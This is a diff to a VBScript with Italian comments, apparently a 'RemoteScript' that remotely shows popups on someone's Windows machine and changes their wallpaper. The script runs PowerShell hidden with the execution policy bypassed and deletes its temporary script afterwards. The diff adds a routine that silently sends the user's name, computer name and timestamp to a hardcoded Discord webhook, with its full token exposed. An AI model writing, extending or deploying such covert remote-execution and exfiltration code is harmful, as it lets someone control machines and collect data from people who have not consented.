@@ -1,15 +1,21 @@
 Option Explicit
 On Error Resume Next
-
+ 
 Dim shell, fso, urlImmagine, urlMessaggio, percorsoLocale, percorsoScript, scriptPS, messaggioDalWeb, xmlHttp
-
+Dim webhookURL, nomeUtente, nomePC
+ 
 ' URL ottimizzati per il download diretto
 urlImmagine = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
 urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"
-
+webhookURL = "https://discord.com/api/webhooks/1460587962629619847/8IK_koKZe-q3-2J_lj6BfhloqM8AnekQpqC_z9VVj0D49-4BaFZqpeSafRjC21KqjgmW"
+ 
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-
+ 
+' Ottieni informazioni sistema
+nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%")
+nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
+ 
 ' --- 1. RECUPERA IL MESSAGGIO ---
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 xmlHttp.Open "GET", urlMessaggio, False
@@ -17,7 +23,7 @@ xmlHttp.Send
 If xmlHttp.Status = 200 Then
     messaggioDalWeb = Trim(xmlHttp.responseText)
 End If
-
+ 
 ' --- 2. MOSTRA IL POPUP (Solo se il messaggio non è vuoto) ---
 If messaggioDalWeb <> "" Then
     Dim comandoPopup
@@ -30,12 +36,15 @@ If messaggioDalWeb <> "" Then
         "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
         "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
     shell.Run comandoPopup, 0, True
+    
+    ' --- INVIA NOTIFICA DISCORD DOPO IL POPUP ---
+    InviaNotificaDiscord webhookURL, nomeUtente, nomePC, messaggioDalWeb
 End If
-
+ 
 ' --- 3. CAMBIO SFONDO ---
 percorsoLocale = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
 percorsoScript = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"
-
+ 
 ' PowerShell scarica l'immagine e forza l'aggiornamento dei parametri di sistema
 scriptPS = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
     "(New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocale & "'); " & _
@@ -47,16 +56,41 @@ scriptPS = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolT
     "using System; using System.Runtime.InteropServices; " & vbCrLf & _
     "public class Wallpaper { [DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); } " & vbCrLf & _
     "'@; Add-Type -TypeDefinition $code; [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x0003); } } catch {}"
-
+ 
 Dim f
 Set f = fso.CreateTextFile(percorsoScript, True)
 f.Write scriptPS
 f.Close
-
+ 
 shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoScript & """", 0, True
-
+ 
 ' --- 4. PULIZIA ---
 WScript.Sleep 5000
 If fso.FileExists(percorsoScript) Then fso.DeleteFile percorsoScript
-
-
+ 
+' --- FUNZIONE PER INVIARE NOTIFICA DISCORD ---
+Sub InviaNotificaDiscord(webhook, utente, pc, messaggio)
+    On Error Resume Next
+    Dim http, payload, timestamp
+    timestamp = Now()
+    
+    ' Costruisci il payload JSON
+    payload = "{""content"":""📢 **Popup visualizzato**""," & _
+              """embeds"":[{" & _
+              """title"":""Notifica Script""," & _
+              """color"":5814783," & _
+              """fields"":[" & _
+              "{""name"":""👤 Utente"",""value"":""" & utente & """,""inline"":true}," & _
+              "{""name"":""💻 PC"",""value"":""" & pc & """,""inline"":true}," & _
+              "{""name"":""📝 Messaggio"",""value"":""" & Replace(messaggio, """", "\""") & """,""inline"":false}," & _
+              "{""name"":""🕐 Timestamp"",""value"":""" & timestamp & """,""inline"":false}" & _
+              "]," & _
+              """footer"":{""text"":""Script Execution Log""}" & _
+              "}]}"
+    
+    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    http.Open "POST", webhook, False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.Send payload
+    Set http = Nothing
+End Sub
